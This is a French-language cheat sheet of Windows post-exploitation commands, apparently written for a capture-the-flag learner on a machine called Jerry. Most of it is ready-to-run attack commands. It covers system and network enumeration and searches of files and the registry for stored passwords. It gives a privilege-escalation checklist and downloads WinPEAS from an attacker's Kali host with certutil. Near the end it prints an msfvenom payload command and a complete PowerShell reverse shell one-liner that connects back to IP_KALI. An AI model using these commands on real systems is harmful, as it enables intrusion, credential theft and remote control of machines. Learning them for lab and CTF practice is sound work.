## Commandes Windows Post-Exploitation 🪟

---

## Équivalences Linux → Windows

| Linux | Windows | Description |
|-------|---------|-------------|
| `whoami` | `whoami` | User actuel |
| `id` | `whoami /all` | User + groupes + privilèges |
| `hostname` | `hostname` | Nom machine |
| `uname -a` | `systeminfo` | Info système complète |
| `cat /etc/passwd` | `net user` | Liste des users |
| `ls -la` | `dir /a` | Lister fichiers |
| `pwd` | `cd` | Répertoire actuel |
| `ps aux` | `tasklist` | Processus en cours |
| `cat fichier` | `type fichier` | Lire un fichier |
| `find / -name` | `dir /s /b nom` | Chercher fichier |
| `sudo -l` | `whoami /priv` | Privilèges disponibles |

---

## Enumération initiale — Dans l'ordre

```cmd
whoami
whoami /all
hostname
systeminfo
net user
net localgroup administrators
ipconfig /all
```

---

## Chercher les flags

```cmd
# User flag
dir /s /b user.txt
type C:\Users\[USERNAME]\Desktop\user.txt

# Root flag  
dir /s /b root.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

## Enumération réseau

```cmd
netstat -ano
ipconfig /all
route print
```

---

## Enumération services/processus

```cmd
tasklist /svc
sc query
net start
```

---

## Chercher fichiers intéressants

```cmd
# Fichiers de config
dir /s /b *.config
dir /s /b *.xml
dir /s /b *.txt
dir /s /b *.ini

# Chercher "password" dans fichiers
findstr /si password *.xml *.ini *.txt *.config
```

---

## Privesc Windows — Checklist

```cmd
# 1. Privilèges
whoami /priv

# 2. Patches manquants
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe list brief

# 3. Services modifiables
sc query
icacls "C:\Program Files\*"

# 4. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# 5. Credentials stockés
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
```

---

## Outils privesc Windows

```
WinPEAS    → équivalent LinPEAS
PowerUp    → cherche misconfigs
Seatbelt   → enumération complète
```

**Transfert depuis Kali :**
```bash
# Kali — serveur HTTP
python3 -m http.server 8080

# Windows — télécharger
certutil -urlcache -split -f http://IP_KALI:8080/winpeas.exe winpeas.exe
powershell -c "Invoke-WebRequest http://IP_KALI:8080/winpeas.exe -OutFile winpeas.exe"
```

---

## Reverse Shells Windows

```bash
# Msfvenom — générer payload
msfvenom -p windows/shell_reverse_tcp LHOST=IP_KALI LPORT=4444 -f exe > shell.exe

# Powershell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP_KALI',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

**Garde ça dans ta cheatsheet Windows !** 💪

**Tu es sur Jerry — qu'est-ce que tu vois comme shell et quel user tu es ?** 🎯
